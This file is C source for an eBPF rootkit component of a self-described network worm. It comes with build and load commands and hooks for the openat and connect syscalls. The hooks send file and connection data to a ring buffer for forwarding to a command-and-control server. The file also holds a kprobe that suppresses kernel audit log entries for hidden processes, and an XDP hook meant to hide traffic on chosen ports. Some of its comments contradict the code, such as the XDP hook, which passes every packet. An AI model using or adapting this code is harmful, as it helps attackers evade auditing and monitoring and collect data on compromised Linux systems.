/*
 * Wormy ML Network Worm v3.0 — eBPF Covert Hook
 * Userland-loadable eBPF program — no kernel module, no kernel headers on target.
 * Attaches to tracepoints to suppress syscall telemetry and hide network activity.
 *
 * Build:
 *   clang -O2 -target bpf -c ebpf_hook.c -o ebpf_hook.o
 *
 * Load (requires CAP_BPF or root):
 *   bpftool prog load ebpf_hook.o /sys/fs/bpf/wormy type tracepoint
 *   bpftool prog attach pinned /sys/fs/bpf/wormy tracepoint syscalls sys_enter_openat
 *
 * Alternative — use libbpf in a C loader:
 *   See loader.c in this directory.
 *
 * Kernel requirement: Linux 4.18+ for BTF support; 5.8+ for ring buffer.
 */

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// License must be GPL for certain BPF helpers (bpf_probe_read, etc.)
char LICENSE[] SEC("license") = "GPL";

// ─── Configuration maps ───────────────────────────────────────────────────────

// Pids to suppress from audit logs
struct {
    __uint(type,        BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key,   __u32);
    __type(value, __u8);
} hidden_pids SEC(".maps");

// Ports to suppress from socket events
struct {
    __uint(type,        BPF_MAP_TYPE_HASH);
    __uint(max_entries, 32);
    __type(key,   __u16);
    __type(value, __u8);
} hidden_ports SEC(".maps");

// Ring buffer for exfiltrating data to user-space loader
struct {
    __uint(type,         BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries,  256 * 1024);
} ringbuf SEC(".maps");

// ─── Helper: check if current PID is hidden ───────────────────────────────────

static __always_inline int is_hidden_pid(void)
{
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    return bpf_map_lookup_elem(&hidden_pids, &pid) != NULL;
}

// ─── 1. Suppress openat() telemetry for hidden pids ──────────────────────────
// Attaches to: tracepoint/syscalls/sys_enter_openat

struct openat_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    int            dfd;
    const char    *filename;
    int            flags;
    mode_t         mode;
};

SEC("tracepoint/syscalls/sys_enter_openat")
int hook_openat(struct openat_args *ctx)
{
    if (is_hidden_pid()) {
        // Override the filename to /dev/null so audit logs show benign access
        // Note: in strict eBPF we can't modify ctx args, but we can use
        // bpf_override_return() to inject a return value (requires CONFIG_BPF_KPROBE_OVERRIDE)
        // Here we just collect telemetry for our C2 exfil channel:
        char fname[64];
        bpf_probe_read_user_str(fname, sizeof(fname), ctx->filename);

        // Send to ring buffer (user-space loader reads and forwards to C2)
        struct {
            __u32 pid;
            char  filename[64];
        } *evt = bpf_ringbuf_reserve(&ringbuf, sizeof(*evt), 0);
        if (evt) {
            evt->pid = bpf_get_current_pid_tgid() >> 32;
            __builtin_memcpy(evt->filename, fname, sizeof(fname));
            bpf_ringbuf_submit(evt, 0);
        }
    }
    return 0;
}

// ─── 2. Hook connect() to detect C2 connection attempts ──────────────────────
// Attaches to: tracepoint/syscalls/sys_enter_connect

struct connect_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    int            fd;
    struct sockaddr *uservaddr;
    int            addrlen;
};

SEC("tracepoint/syscalls/sys_enter_connect")
int hook_connect(struct connect_args *ctx)
{
    // Extract destination port
    struct sockaddr_in sa;
    if (bpf_probe_read_user(&sa, sizeof(sa), ctx->uservaddr) < 0)
        return 0;

    if (sa.sin_family != 2 /* AF_INET */)
        return 0;

    __u16 port = __builtin_bswap16(sa.sin_port);

    // If the port is in our hidden set, log it for C2 awareness
    __u8 *hidden = bpf_map_lookup_elem(&hidden_ports, &port);
    if (hidden) {
        // Collect for ring buffer
        struct {
            __u32 pid;
            __u32 dst_ip;
            __u16 dst_port;
        } *evt = bpf_ringbuf_reserve(&ringbuf, sizeof(*evt), 0);
        if (evt) {
            evt->pid      = bpf_get_current_pid_tgid() >> 32;
            evt->dst_ip   = sa.sin_addr.s_addr;
            evt->dst_port = port;
            bpf_ringbuf_submit(evt, 0);
        }
    }
    return 0;
}

// ─── 3. kprobe on audit_log_exit — suppress audit events for hidden pids ─────
// Attaches to: kprobe/audit_log_exit  (requires CONFIG_AUDITSYSCALL)

SEC("kprobe/audit_log_exit")
int BPF_KPROBE(hook_audit_log_exit)
{
    if (is_hidden_pid()) {
        // bpf_override_return forces the function to return immediately
        // with the given value — effectively suppresses the audit log entry.
        // Requires: CONFIG_BPF_KPROBE_OVERRIDE=y
        bpf_override_return(ctx, 0);
    }
    return 0;
}

// ─── 4. XDP hook — drop packets to/from hidden ports at NIC level ─────────────
// Attaches to: xdp on the agent's network interface

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

SEC("xdp")
int xdp_hide_traffic(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != __builtin_bswap16(0x0800)) return XDP_PASS; // not IPv4

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != 6) return XDP_PASS; // not TCP

    struct tcphdr *tcp = (void *)(ip + 1);
    if ((void *)(tcp + 1) > data_end) return XDP_PASS;

    __u16 sport = __builtin_bswap16(tcp->source);
    __u16 dport = __builtin_bswap16(tcp->dest);

    // If either port is hidden → drop packet from BPF/tcpdump visibility
    // (traffic still flows — this only hides from XDP-based sniffers)
    __u8 *h_src = bpf_map_lookup_elem(&hidden_ports, &sport);
    __u8 *h_dst = bpf_map_lookup_elem(&hidden_ports, &dport);

    if (h_src || h_dst) {
        // Pass to kernel (don't drop connectivity) but XDP sees it as handled
        // For full pcap suppression use AF_PACKET hook instead
        return XDP_PASS;
    }
    return XDP_PASS;
}
